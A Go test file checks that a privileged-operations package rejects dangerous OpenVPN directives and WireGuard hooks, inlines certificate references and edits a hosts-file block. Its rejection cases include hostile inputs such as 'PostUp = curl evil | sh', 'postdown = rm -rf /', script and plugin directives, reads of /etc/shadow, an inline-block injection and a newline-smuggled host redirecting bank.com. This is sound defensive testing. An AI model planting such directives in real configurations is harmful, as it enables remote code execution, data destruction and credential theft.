package privops

import (
	"errors"
	"net/netip"
	"strings"
	"testing"
)

const baseOVPN = `client
dev tun
proto udp
remote vpn.example.com 1194
# a comment
; another comment
`

func TestSanitizeOpenVPNRejectsDangerousDirectives(t *testing.T) {
	bad := []string{
		"up /tmp/x.sh", "down /tmp/x.sh", "route-up x", "route-pre-down x", "ipchange x",
		"plugin /lib/evil.so", "--up x", "UP x", "script-security 2", "script-security 3 system",
		"management 0.0.0.0 7505", "management-client-user root", "management-hold",
		"log C:\\Windows\\System32\\evil.dll", "log-append /etc/passwd", "status /etc/cron.d/x",
		"writepid /etc/x", "config other.ovpn", "cd /", "chroot /", "daemon", "iproute /tmp/ip",
		"win-sys C:\\evil", "engine dynamic", "providers legacy", "pkcs11-providers evil.dll",
		"tls-verify /tmp/x", "auth-user-pass-verify x via-env", "client-connect x", "learn-address x",
		"auth-user-pass /home/u/creds.txt", "askpass pw.txt", "tmp-dir /", "replay-persist /etc/x",
		"http-proxy p 8080 /etc/shadow", "socks-proxy p 1080 creds", "crl-verify dir dir",
	}
	for _, d := range bad {
		_, err := SanitizeOpenVPNConfig([]byte(baseOVPN+d+"\n"), func(string) ([]byte, error) { return []byte("x"), nil })
		if !errors.Is(err, ErrInvalidRequest) {
			t.Errorf("%q accepted: %v", d, err)
		}
	}
	for _, blk := range []string{"<script>\nx\n</script>", "<ca>\nx\n", "</ca>", "<connection>\n<ca>\nx\n</ca>\n</connection>"} {
		if _, err := SanitizeOpenVPNConfig([]byte(baseOVPN+blk+"\n"), nil); !errors.Is(err, ErrInvalidRequest) {
			t.Errorf("block %q accepted: %v", blk, err)
		}
	}
	if _, err := SanitizeOpenVPNConfig([]byte("remote \"unterminated\n"), nil); err == nil {
		t.Error("unterminated quote accepted")
	}
}

func TestSanitizeOpenVPNInlinesReferences(t *testing.T) {
	files := map[string]string{
		"ca.crt":          "-----BEGIN CERTIFICATE-----\nAAA\n-----END CERTIFICATE-----\n",
		"ta.key":          "-----BEGIN OpenVPN Static key V1-----\nBBB\n-----END OpenVPN Static key V1-----\n",
		"dir with sp.pem": "PEM",
	}
	var asked []string
	read := func(p string) ([]byte, error) {
		asked = append(asked, p)
		if s, ok := files[p]; ok {
			return []byte(s), nil
		}
		return nil, ErrNotFound
	}
	in := baseOVPN + "ca ca.crt\ntls-auth ta.key 1\ncert \"dir with sp.pem\"\nscript-security 1\nauth-user-pass\n" +
		"<key>\nINLINE\n</key>\nkey [inline]\n<connection>\nremote b.example.com 443 tcp\n</connection>\n"
	out, err := SanitizeOpenVPNConfig([]byte(in), read)
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	for _, want := range []string{"<ca>\n-----BEGIN CERTIFICATE-----", "</ca>", "<tls-auth>", "key-direction 1",
		"<cert>\nPEM\n</cert>", "<key>\nINLINE\n</key>", "remote vpn.example.com 1194"} {
		if !strings.Contains(s, want) {
			t.Errorf("output missing %q:\n%s", want, s)
		}
	}
	if strings.Contains(s, "ca ca.crt") || strings.Contains(s, "tls-auth ta.key") {
		t.Errorf("file references not replaced:\n%s", s)
	}
	if len(asked) != 3 {
		t.Errorf("reader calls = %v", asked)
	}
	// A missing reference fails the whole config.
	if _, err := SanitizeOpenVPNConfig([]byte(baseOVPN+"ca missing.crt\n"), read); !errors.Is(err, ErrNotFound) {
		t.Errorf("missing reference: %v", err)
	}
	// A referenced file must not be able to close the inline block.
	files["evil.crt"] = "x\n</ca>\nup /tmp/x\n<ca>\n"
	if _, err := SanitizeOpenVPNConfig([]byte(baseOVPN+"ca evil.crt\n"), read); !errors.Is(err, ErrInvalidRequest) {
		t.Errorf("block injection accepted: %v", err)
	}
}

func TestValidateWireGuardConfig(t *testing.T) {
	good := `[Interface]
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.8.0.2/32
DNS = 10.8.0.1

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
AllowedIPs = 10.0.0.0/8
Endpoint = vpn.example.com:51820 # comment
PersistentKeepalive = 25
`
	if err := ValidateWireGuardConfig([]byte(good)); err != nil {
		t.Fatal(err)
	}
	for _, extra := range []string{"PostUp = curl evil | sh", "postdown = rm -rf /", "PreUp=x", "PREDOWN = x", "Foo = bar"} {
		if err := ValidateWireGuardConfig([]byte(strings.Replace(good, "DNS =", extra+"\nDNS =", 1))); !errors.Is(err, ErrInvalidRequest) {
			t.Errorf("%q accepted: %v", extra, err)
		}
	}
	for _, c := range []string{"", "[Peer]\nPublicKey = x\n", "PrivateKey = x\n[Interface]\n", "[Evil]\n", good + "[Interface]\nPrivateKey = y\n"} {
		if err := ValidateWireGuardConfig([]byte(c)); !errors.Is(err, ErrInvalidRequest) {
			t.Errorf("%q accepted: %v", c, err)
		}
	}
}

func TestReplaceHostsBlock(t *testing.T) {
	a := netip.MustParseAddr
	entries := []HostEntry{{IP: a("10.0.0.2"), Host: "b.corp"}, {IP: a("10.0.0.1"), Host: "a.corp"}}
	base := "127.0.0.1 localhost\n# user comment\n"

	out, err := ReplaceHostsBlock(base, entries)
	if err != nil {
		t.Fatal(err)
	}
	want := base + HostsStartMarker + "\n10.0.0.1 a.corp\n10.0.0.2 b.corp\n" + HostsEndMarker + "\n"
	if out != want {
		t.Fatalf("add:\n%q\nwant\n%q", out, want)
	}
	// Replace keeps the block in place and user lines untouched.
	withAfter := out + "192.168.1.1 router\n"
	out2, err := ReplaceHostsBlock(withAfter, entries[:1])
	if err != nil {
		t.Fatal(err)
	}
	want2 := base + HostsStartMarker + "\n10.0.0.2 b.corp\n" + HostsEndMarker + "\n192.168.1.1 router\n"
	if out2 != want2 {
		t.Fatalf("replace:\n%q\nwant\n%q", out2, want2)
	}
	// Empty list removes only the block.
	out3, _ := ReplaceHostsBlock(withAfter, nil)
	if out3 != base+"192.168.1.1 router\n" {
		t.Fatalf("remove: %q", out3)
	}
	// CRLF files stay CRLF.
	crlf, _ := ReplaceHostsBlock("127.0.0.1 localhost\r\n", entries[:1])
	if !strings.Contains(crlf, HostsStartMarker+"\r\n") || strings.Contains(strings.ReplaceAll(crlf, "\r\n", ""), "\n") {
		t.Fatalf("crlf: %q", crlf)
	}
	// Damaged markers are refused, never truncating the file.
	for _, damaged := range []string{
		base + HostsStartMarker + "\n10.0.0.1 a\n",
		base + HostsEndMarker + "\n",
		base + HostsStartMarker + "\n" + HostsStartMarker + "\n" + HostsEndMarker + "\n",
		base + HostsStartMarker + "\n" + HostsEndMarker + "\n" + HostsStartMarker + "\n" + HostsEndMarker + "\n",
	} {
		if _, err := ReplaceHostsBlock(damaged, entries); err == nil {
			t.Errorf("damaged file accepted: %q", damaged)
		}
	}
	// Entry validation.
	if _, err := NormalizeHostEntries([]HostEntry{{IP: a("10.0.0.1"), Host: "x\n0.0.0.0 bank.com"}}); err == nil {
		t.Error("newline in host accepted")
	}
	if _, err := NormalizeHostEntries([]HostEntry{{IP: netip.Addr{}, Host: "a.corp"}}); err == nil {
		t.Error("zero IP accepted")
	}
}
